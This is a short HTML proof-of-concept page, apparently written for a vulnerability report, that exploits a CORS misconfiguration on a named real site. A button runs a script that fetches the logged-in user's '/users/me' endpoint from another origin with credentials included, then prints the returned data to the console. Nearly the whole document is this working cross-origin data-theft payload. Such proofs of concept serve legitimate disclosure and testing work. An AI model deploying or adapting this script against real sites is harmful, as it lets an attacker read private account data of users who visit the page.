<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC</title>
</head>
<body>
    <h1>CORS Exploit PoC</h1>
    <button onclick="exploit()">Exploit CORS</button>
    <script>
        function exploit() {
            fetch('https://insider.in/users/me', {
                method: 'GET',
                credentials: 'include'
            })
            .then(response => response.text())
            .then(data => {
                console.log('Data:', data);
                alert('Check the console for the response data.');
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Failed to exploit CORS.');
            });
        }
    </script>
